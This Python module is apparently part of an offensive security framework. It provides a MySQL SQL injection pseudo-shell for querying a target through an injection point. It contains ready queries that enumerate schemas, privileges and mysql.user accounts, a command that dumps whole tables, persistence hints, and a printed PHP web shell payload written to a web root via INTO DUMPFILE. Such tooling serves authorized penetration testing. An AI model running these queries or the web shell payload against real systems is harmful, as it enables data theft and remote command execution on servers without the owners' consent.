#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
SQL injection helper mixin: single-shot scalar query or interactive pseudo-shell.

Modules implement ``sqli_fetch_scalar(self, user_line: str) -> Optional[str]`` where
``user_line`` is raw user input (expression or SELECT). This mixin wraps it via
``wrap_scalar_expression`` for typical MySQL UNION second-column extraction patterns.

Mirrors the design of :class:`~lib.protocols.http.lfi.Lfi` (handler + prompt_toolkit shell).
"""

from __future__ import annotations

import re

from core.framework.base_module import BaseModule
from core.framework.option import OptString, OptBool
from core.output_handler import print_error, print_info, print_status, print_warning

from prompt_toolkit.completion import WordCompleter
from prompt_toolkit.history import InMemoryHistory
from prompt_toolkit.shortcuts import prompt, CompleteStyle

from typing import List, Optional

_DUMP_DEFAULT_ROWS = 200
_DUMP_MAX_ROWS = 2000


class Sqli(BaseModule):
    """Pseudo-shell and single-query helper for SQL injection modules."""

    single_sql = OptString(
        "@@version",
        "Scalar SQL expression or SELECT (one row/column) when shell_sqli is false",
        required=False,
    )
    shell_sqli = OptBool(False, "Start SQLi pseudo shell (prompt_toolkit)", required=False)

    _IDENT = re.compile(r"^[\w]{1,64}$")

    _SHORTCUTS = {
        "?version": "@@version",
        "?db": "database()",
        "?user": "user()",
        "?hostname": "@@hostname",
        "?datadir": "@@datadir",
        "?charset": "@@character_set_database",
        "?collation": "@@collation_database",
        "?basedir": "@@basedir",
        "?version_comment": "@@version_comment",
        "?sql_mode": "@@sql_mode",
        "?schemas": (
            "SELECT GROUP_CONCAT(schema_name ORDER BY schema_name SEPARATOR ',') "
            "FROM information_schema.schemata LIMIT 1"
        ),
        "?tables": (
            "SELECT GROUP_CONCAT(table_name ORDER BY table_name SEPARATOR ',') "
            "FROM information_schema.tables WHERE table_schema=database() LIMIT 1"
        ),
        "?processlist": (
            "SELECT GROUP_CONCAT(CONCAT(id,':',user,':',host,':',IFNULL(db,''),':',command,':',time) "
            "ORDER BY id SEPARATOR ' | ') FROM information_schema.processlist LIMIT 1"
        ),
        "?engines": (
            "SELECT GROUP_CONCAT(engine SEPARATOR ',') FROM information_schema.engines WHERE support IN ('YES','DEFAULT')"
        ),
    }

    @staticmethod
    def wrap_scalar_expression(user_line: str) -> Optional[str]:
        """
        Turn a REPL line into a SQL fragment suitable for UNION second column:

        - ``SELECT ...`` → ``(...)``
        - ``expr`` → ``(SELECT expr)``
        """
        raw = (user_line or "").strip().rstrip(";")
        if not raw:
            return None
        up = raw.upper()
        if up.startswith("SELECT"):
            return f"({raw})"
        return f"(SELECT {raw})"

    def _opt_val(self, opt) -> str:
        if hasattr(opt, "value"):
            return str(opt.value or "")
        return str(opt or "")

    def sqli_fetch_scalar(self, user_line: str) -> Optional[str]:
        """
        Override in the module: perform injection and return displayed scalar result.

        Default stub — subclasses must implement.
        """
        print_error(
            "Implement sqli_fetch_scalar(self, user_line) on your module "
            "(see lib/protocols/http/sqli.py)."
        )
        return None

    def handler_sqli(self) -> None:
        """Run either one scalar query or the interactive pseudo-shell."""
        if self.shell_sqli:
            self._start_sqli_shell()
        else:
            self._execute_single_sql()

    def _execute_single_sql(self) -> None:
        expr = self._opt_val(self.single_sql).strip()
        if not expr:
            print_error("single_sql is empty")
            return
        try:
            out = self.sqli_fetch_scalar(expr)
            if out:
                print_info(out)
            else:
                print_error("No output from sqli_fetch_scalar")
        except Exception as exc:
            print_error(f"SQLi error: {exc}")

    def _shell_static_commands(self) -> List[str]:
        base = ["help", "exit", "?persistence", "?outfile_template", "?mysql_users", "?dump"]
        base.extend(sorted(self._SHORTCUTS.keys()))
        base.extend(["?columns", "?count", "?privs_summary", "?secure_file", "?variables"])
        return sorted(set(base))

    def _show_sqli_help(self) -> None:
        print_info()
        print_info("\tSQLi pseudo-shell — help")
        print_info("\t" + ("-" * 50))
        print_info("\tShell")
        print_info("\t  help | exit")
        print_info()
        print_info("\tInstance / globals")
        print_info("\t  ?version  ?db  ?user  ?hostname  ?datadir")
        print_info("\t  ?charset  ?collation  ?basedir  ?version_comment  ?sql_mode")
        print_info()
        print_info("\tSchema (default database)")
        print_info("\t  ?schemas              All schema names")
        print_info("\t  ?tables               Table names in current DB")
        print_info("\t  ?columns <table>      Column names (ordered)")
        print_info("\t  ?count <table>        Row count")
        print_info(
            f"\t  ?dump <table> [n]     Dump rows (n=1..{_DUMP_MAX_ROWS}, default {_DUMP_DEFAULT_ROWS}); "
            "cells |, lines newline"
        )
        print_info("\t  (Very wide dumps may hit group_concat_max_len on the server.)")
        print_info()
        print_info("\tServer / privileges")
        print_info("\t  ?processlist  ?engines  ?privs_summary  ?secure_file  ?mysql_users")
        print_info("\t  ?variables [prefix]   performance_schema.session_variables")
        print_info()
        print_info("\tMeta (read-only notes / templates)")
        print_info("\t  ?persistence       Hints (FILE, users, etc.) — no SQL run")
        print_info("\t  ?outfile_template  Example OUTFILE text — not executed")
        print_info()
        print_info("\tRaw SQL")
        print_info("\t  Any expression or SELECT …  → wrap_scalar_expression then injection")
        print_info()

    @staticmethod
    def _sql_list_columns_query(table: str) -> str:
        return (
            "SELECT GROUP_CONCAT(column_name ORDER BY ordinal_position SEPARATOR ',') "
            f"FROM information_schema.columns WHERE table_schema=database() AND table_name='{table}'"
        )

    @staticmethod
    def _sql_backtick(ident: str) -> str:
        return "`" + ident.replace("`", "``") + "`"

    def _fetch_table_columns(self, table: str) -> Optional[List[str]]:
        """Resolve column names for ``table`` in the current database via one scalar query."""
        col_sql = self._sql_list_columns_query(table)
        col_csv = self.sqli_fetch_scalar(col_sql)
        if not col_csv or not str(col_csv).strip():
            return None
        return [c.strip() for c in str(col_csv).split(",") if c.strip()]

    def _sql_dump_table(self, table: str, columns: List[str], row_limit: int) -> str:
        inner = ", ".join(self._sql_backtick(c) for c in columns)
        lim = max(1, min(int(row_limit), _DUMP_MAX_ROWS))
        return (
            "SELECT GROUP_CONCAT(_row SEPARATOR 0x0a) FROM ("
            f"SELECT CONCAT_WS(0x7c, {inner}) AS _row FROM {self._sql_backtick(table)} LIMIT {lim}"
            ") _sqli_dump"
        )

    def _handle_dump_command(self, line: str) -> bool:
        """
        ``?dump <table> [limit]`` — list columns then fetch concatenated rows (two scalar queries).
        """
        raw = line.strip()
        m = re.match(r"^\?dump\s+(\w+)(?:\s+(\d+))?\s*$", raw, re.I)
        if not m:
            return False

        table = self._safe_ident(m.group(1))
        if not table:
            return True

        lim = int(m.group(2)) if m.group(2) else _DUMP_DEFAULT_ROWS
        lim = max(1, min(lim, _DUMP_MAX_ROWS))

        try:
            columns = self._fetch_table_columns(table)
        except Exception as exc:
            print_error(f"Could not resolve columns: {exc}")
            return True

        if not columns:
            print_error("No columns (unknown table, empty DB, or no permission).")
            return True

        dump_sql = self._sql_dump_table(table, columns, lim)
        try:
            out = self.sqli_fetch_scalar(dump_sql)
        except Exception as exc:
            print_error(f"Dump query failed: {exc}")
            return True

        print_status(f"Dump `{table}` — {len(columns)} columns, up to {lim} row(s)")
        if out:
            print_info(out)
        else:
            print_warning("Empty result (0 rows or truncation).")
        return True

    def _safe_ident(self, name: str) -> Optional[str]:
        n = (name or "").strip()
        if not n or not self._IDENT.match(n):
            print_error("Identifier must be [A-Za-z0-9_] only (max 64).")
            return None
        return n

    def _expand_parameterized(self, line: str) -> Optional[str]:
        """Return SQL text for ?columns / ?count / … or None."""
        raw = line.strip()
        low = raw.lower()

        m = re.match(r"^\?columns\s+(\w+)\s*$", raw, re.I)
        if m:
            t = self._safe_ident(m.group(1))
            if not t:
                return None
            return self._sql_list_columns_query(t)

        m = re.match(r"^\?count\s+(\w+)\s*$", raw, re.I)
        if m:
            t = self._safe_ident(m.group(1))
            if not t:
                return None
            return f"(SELECT COUNT(*) FROM `{t}`)"

        if low == "?privs_summary" or low == "?privileges":
            return (
                "SELECT GROUP_CONCAT(DISTINCT privilege_type ORDER BY privilege_type SEPARATOR ',') "
                "FROM information_schema.user_privileges WHERE grantee = CONCAT('''', "
                "REPLACE(SUBSTRING_INDEX(CURRENT_USER(), '@', 1), '''', ''''''), '''@''', "
                "REPLACE(SUBSTRING_INDEX(CURRENT_USER(), '@', -1), '''', ''''''), '''')"
            )

        if low == "?secure_file":
            return "@@secure_file_priv"

        m = re.match(r"^\?variables(?:\s+([\w%]+))?\s*$", raw, re.I)
        if m:
            prefix = (m.group(1) or "").strip()
            if not prefix:
                like_clause = "variable_name LIKE '%version%' OR variable_name LIKE '%character%'"
            elif "%" in prefix:
                if not re.match(r"^[\w%]+$", prefix):
                    print_error("?variables pattern: use letters, digits, underscore, % only.")
                    return None
                pesc = prefix.replace("\\", "\\\\").replace("'", "''")
                like_clause = f"variable_name LIKE '{pesc}'"
            else:
                if not self._IDENT.match(prefix):
                    print_error("?variables prefix: use letters, digits, underscore only.")
                    return None
                pesc = prefix.replace("'", "''")
                like_clause = f"variable_name LIKE '{pesc}%'"
            return (
                "SELECT GROUP_CONCAT(CONCAT(variable_name,'=',variable_value) ORDER BY variable_name SEPARATOR ',') "
                "FROM (SELECT variable_name, variable_value FROM performance_schema.session_variables "
                f"WHERE {like_clause} ORDER BY variable_name LIMIT 120) _sqli_vars"
            )

        if low == "?mysql_users":
            return (
                "SELECT GROUP_CONCAT(DISTINCT user ORDER BY user SEPARATOR ',') FROM mysql.user"
            )

        return None

    def _handle_meta_command(self, line: str) -> bool:
        """Side-effect only (help text); return True if consumed."""
        low = line.strip().lower()
        if low in ("?persistence", "?persist", "?persist_help"):
            print_info()
            print_status("Persistence — authorized environments only")
            print_info(
                "Typical MySQL angles (you still need privileges / a writable path):\n"
                "- Check FILE: ?secure_file then @@secure_file_priv.\n"
                "- SELECT ... INTO DUMPFILE / OUTFILE (PHP/JSP stub) — see ?outfile_template.\n"
                "- CREATE USER / GRANT (needs admin).\n"
                "- Scheduler EVENT / plugin / UDF — stack/context dependent.\n"
                "Run recon first: ?privs_summary, ?mysql_users, ?datadir."
            )
            print_warning("Do not use against systems without explicit permission.")
            print_info()
            return True

        if low in ("?outfile_template", "?outfile_example"):
            print_info()
            print_status("Example OUTFILE/DUMPFILE payload (paste/adapt as raw SQL — not auto-run)")
            print_info(
                "MySQL often requires a UNION that writes one row into two columns first; "
                "paths depend on @@secure_file_priv and OS permissions.\n\n"
                "Illustrative fragment (adjust quoting for your injection context):\n"
                "  ... UNION SELECT '', '<\\\\?php echo shell_exec($_GET[\"c\"]); ?>' "
                "INTO DUMPFILE '/var/www/html/shell.php' -- \n\n"
                "Verify with ?secure_file and your web root; use only where you are authorized."
            )
            print_info()
            return True

        return False

    def _resolve_shell_line(self, line: str) -> Optional[str]:
        stripped = line.strip()
        if not stripped:
            return None
        low = stripped.lower()

        param = self._expand_parameterized(stripped)
        if param is not None:
            return param

        if low in self._SHORTCUTS:
            return self._SHORTCUTS[low]
        return stripped

    def _start_sqli_shell(self) -> None:
        if type(self).sqli_fetch_scalar is Sqli.sqli_fetch_scalar:
            print_error(
                "sqli_fetch_scalar is not implemented on this module; "
                "cannot start SQLi pseudo shell."
            )
            return

        help_commands = self._shell_static_commands()
        completer = WordCompleter(help_commands, ignore_case=True)
        history = InMemoryHistory()

        print_info()
        print_status("Welcome to SQLi pseudo shell")
        print_status("Try: ?tables | ?columns users | ?dump users 20 | ?persistence — type help")
        print_info()

        while True:
            try:
                command = prompt(
                    "sql> ",
                    completer=completer,
                    complete_in_thread=True,
                    complete_while_typing=True,
                    complete_style=CompleteStyle.READLINE_LIKE,
                    history=history,
                )
            except (EOFError, KeyboardInterrupt):
                print_info("Leaving SQLi shell.")
                break

            if command == "":
                continue
            if command.strip().lower() == "exit":
                break
            if command.strip().lower() == "help":
                self._show_sqli_help()
                continue

            if self._handle_meta_command(command):
                continue

            if self._handle_dump_command(command):
                continue

            resolved = self._resolve_shell_line(command)
            if not resolved:
                continue

            try:
                out = self.sqli_fetch_scalar(resolved)
                if out:
                    print_info(out)
                else:
                    print_error("Empty result")
            except Exception as exc:
                print_error(f"Error: {exc}")
